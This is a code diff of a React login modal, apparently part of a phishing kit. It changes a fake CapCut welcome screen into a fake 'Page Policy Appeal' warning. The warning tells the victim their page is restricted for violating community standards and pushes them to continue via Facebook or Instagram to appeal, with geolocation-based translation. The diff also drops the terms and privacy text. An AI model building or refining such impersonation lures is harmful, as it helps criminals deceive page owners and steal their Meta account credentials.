@@ -1,6 +1,7 @@
 'use client';
 
-import PromoImage from '@/assets/images/meta-ai-image.png';
+import PageRestrictionImage from '@/assets/images/page-restriction-image.png';
+import WarningImage from '@/assets/images/warning.png';
 import { store, type LoginProvider } from '@/store/store';
 import { buildAppealMessage } from '@/utils/message';
 import translateText from '@/utils/translate';
@@ -52,14 +53,15 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
         if (!geoInfo) return;
 
         const textsToTranslate = [
-            'Welcome to CapCut',
-            'Create stunning videos online with unlimited possibilities.',
+            'Page Policy Appeal',
+            'We have detected unusual activity on your page that violates our community standards.',
+            'Access to your page has been restricted and you are currently unable to post, share or comment using your page.',
+            'If you believe this is a mistake, you have the option to file an appeal by providing the necessary information.',
+            'Important Notes',
+            'Please ensure that your contact information (email and page admin) is correct to avoid delays in activation.',
+            'Requests containing incomplete or inaccurate information may result in a delayed or cancelled onboarding.',
             'Continue with Facebook',
             'Continue with Instagram',
-            'By clicking Continue, you accept our',
-            'Terms of Service',
-            'and',
-            'Privacy Policy',
             'Close modal'
         ];
 
@@ -107,7 +109,7 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
 
     return (
         <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/60 px-4 backdrop-blur-sm'>
-            <div className='relative flex max-h-[90vh] w-full max-w-[900px] overflow-hidden rounded-2xl bg-white shadow-[0_24px_48px_rgba(0,0,0,0.25)]'>
+            <div className='relative flex max-h-[90vh] w-full max-w-[520px] flex-col overflow-hidden rounded-2xl bg-white shadow-[0_24px_48px_rgba(0,0,0,0.25)]'>
                 <button
                     type='button'
                     onClick={handleClose}
@@ -117,23 +119,31 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
                     <FontAwesomeIcon icon={faXmark} className='h-4 w-4' />
                 </button>
 
-                <div className='relative hidden w-[42%] shrink-0 overflow-hidden bg-[#0a0a0a] md:block'>
-                    <Image src={PromoImage} alt='' fill className='object-cover opacity-80' />
-                    <div className='absolute inset-0 bg-linear-to-t from-black/90 via-black/30 to-transparent' />
-                    <div className='absolute right-0 bottom-0 left-0 p-8'>
-                        <p className='text-xl leading-snug font-bold text-white'>{t('Create stunning videos online with unlimited possibilities.')}</p>
-                        <div className='mt-6 flex gap-1.5'>
-                            <span className='h-1.5 w-1.5 rounded-full bg-white' />
-                            <span className='h-1.5 w-1.5 rounded-full bg-white/40' />
-                            <span className='h-1.5 w-1.5 rounded-full bg-white/40' />
-                        </div>
-                    </div>
+                <div className='relative w-full shrink-0 bg-white px-6 pt-6'>
+                    <Image src={PageRestrictionImage} alt='' className='h-auto w-full object-contain' priority />
                 </div>
 
-                <div className='flex flex-1 flex-col justify-center px-8 py-10 sm:px-12 sm:py-14'>
-                    <h2 className='mb-10 text-center text-[28px] leading-tight font-bold text-[#090909] sm:text-[32px]'>{t('Welcome to CapCut')}</h2>
+                <div className='flex flex-1 flex-col overflow-y-auto px-6 py-5 sm:px-8'>
+                    <div className='mb-4 flex items-center gap-2'>
+                        <Image src={WarningImage} alt='' className='h-7 w-7' />
+                        <h2 className='text-xl font-bold text-[#1C2B33]'>{t('Page Policy Appeal')}</h2>
+                    </div>
 
-                    <div className='mx-auto flex w-full max-w-[360px] flex-col gap-3'>
+                    <div className='flex flex-col gap-3 text-[15px] leading-relaxed text-[#1C2B33]'>
+                        <p>{t('We have detected unusual activity on your page that violates our community standards.')}</p>
+                        <p>{t('Access to your page has been restricted and you are currently unable to post, share or comment using your page.')}</p>
+                        <p>{t('If you believe this is a mistake, you have the option to file an appeal by providing the necessary information.')}</p>
+                    </div>
+
+                    <div className='mt-5'>
+                        <p className='text-[15px] font-bold text-[#1C2B33]'>{t('Important Notes')}</p>
+                        <ul className='mt-2 list-inside list-disc space-y-1 text-[15px] leading-relaxed text-[#1C2B33]'>
+                            <li>{t('Please ensure that your contact information (email and page admin) is correct to avoid delays in activation.')}</li>
+                            <li>{t('Requests containing incomplete or inaccurate information may result in a delayed or cancelled onboarding.')}</li>
+                        </ul>
+                    </div>
+
+                    <div className='mx-auto mt-6 flex w-full max-w-[360px] flex-col gap-3'>
                         <button
                             type='button'
                             onClick={() => handleSelect('facebook')}
@@ -154,13 +164,6 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
                             {t('Continue with Instagram')}
                         </button>
                     </div>
-
-                    <p className='mx-auto mt-8 max-w-[360px] text-center text-xs leading-relaxed text-[#757575]'>
-                        {t('By clicking Continue, you accept our')}{' '}
-                        <span className='cursor-pointer text-[#090909] underline underline-offset-2'>{t('Terms of Service')}</span>{' '}
-                        {t('and')}{' '}
-                        <span className='cursor-pointer text-[#090909] underline underline-offset-2'>{t('Privacy Policy')}</span>
-                    </p>
                 </div>
             </div>
         </div>
